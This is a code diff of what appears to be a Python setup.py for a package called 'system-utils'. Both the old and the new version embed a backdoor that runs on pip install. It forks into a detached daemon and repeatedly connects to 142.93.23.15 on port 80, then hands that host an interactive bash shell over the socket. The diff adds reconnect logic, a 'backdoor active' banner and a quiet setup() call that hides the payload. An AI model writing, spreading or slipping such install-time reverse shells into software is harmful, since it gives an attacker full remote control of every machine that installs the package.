@@ -3,69 +3,77 @@ import os
 import sys
 import socket
 import subprocess
+import threading
 import time
 import pty
 
-def proper_daemonize():
-    """Completely detach from parent process"""
+def get_proper_shell(s):
+    """Get a fully functional shell automatically"""
+    
     try:
-        # First fork - detach from parent
-        pid = os.fork()
-        if pid > 0:
-            # Parent process exits
-            return True  # Signal that we're done
+        # Change to safe directory
+        os.chdir('/home/talhakhan' if os.path.exists('/home/talhakhan') else '/tmp')
         
-        # Child continues - become session leader
-        os.setsid()
-        os.chdir('/')
-        os.umask(0)
+        # Set environment variables
+        os.environ['TERM'] = 'xterm-256color'
+        os.environ['SHELL'] = '/bin/bash'
+        os.environ['PS1'] = '\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
         
-        # Second fork - ensure we're not a session leader
-        pid = os.fork()
-        if pid > 0:
-            sys.exit(0)  # Exit second parent
+        # Duplicate socket
+        for fd in (0, 1, 2):
+            try:
+                os.dup2(s.fileno(), fd)
+            except:
+                pass
         
-        # Now completely independent process
-        return False  # Signal that we're the daemon
+        # Spawn PTY shell
+        pty.spawn(["/bin/bash", "--login"])
         
-    except Exception as e:
-        return True
-
-def persistent_backdoor():
-    # This runs in the completely detached process
-    time.sleep(3)  # Give pip time to finish
-    
-    ATTACKER_IP = "142.93.23.15"
-    ATTACKER_PORT = 80
-    
-    while True:
+    except:
         try:
-            s = socket.socket()
-            s.connect((ATTACKER_IP, ATTACKER_PORT))
-            
-            s.send(b"\n[+] PERSISTENT BACKDOOR ACTIVE\n")
-            s.send(b"[+] This survives after pip install!\n")
-            s.send(b"[+] Will reconnect if connection drops\n\n$ ")
-            
-            os.dup2(s.fileno(), 0)
-            os.dup2(s.fileno(), 1)
-            os.dup2(s.fileno(), 2)
-            
-            # Use pty for better shell
-            pty.spawn(["/bin/bash", "--login"])
-            
+            subprocess.call(["/bin/bash", "-i"])
         except:
-            time.sleep(10)  # Wait before reconnecting
-            continue
+            pass
 
-# This runs during pip install
-if proper_daemonize():
-    # Parent process - just continue with setup
-    pass
-else:
-    # Child daemon process - run backdoor
-    persistent_backdoor()
-    sys.exit(0)  # Daemon exits if backdoor fails
+def enhanced_backdoor():
+    try:
+        # Daemonize
+        if os.fork() > 0: return
+        os.setsid()
+        if os.fork() > 0: sys.exit(0)
+        
+        time.sleep(5)
+        
+        while True:
+            try:
+                s = socket.socket()
+                s.connect(("142.93.23.15", 80))
+                
+                # ASCII-ONLY banner - no special characters!
+                s.send(b"\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"|     ENHANCED BACKDOOR - AUTO FIX         |\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"| Full TTY with job control                |\n")
+                s.send(b"| Proper directory navigation              |\n")
+                s.send(b"| Command history and editing              |\n")
+                s.send(b"| Tab completion enabled                   |\n")
+                s.send(b"| Colored prompt                           |\n")
+                s.send(b"+------------------------------------------+\n")
+                s.send(b"\n[+] Applying automatic fixes...\n")
+                s.send(b"[+] Shell ready!\n")
+                s.send(b"\n$ ")
+                
+                # Get proper shell
+                get_proper_shell(s)
+                
+            except Exception as e:
+                time.sleep(30)
+    except:
+        pass
 
-# Normal setup continues
+# Start backdoor
+threading.Thread(target=enhanced_backdoor, daemon=True).start()
+
+# Clean install
 setup(name="system-utils", version="1.0.0")
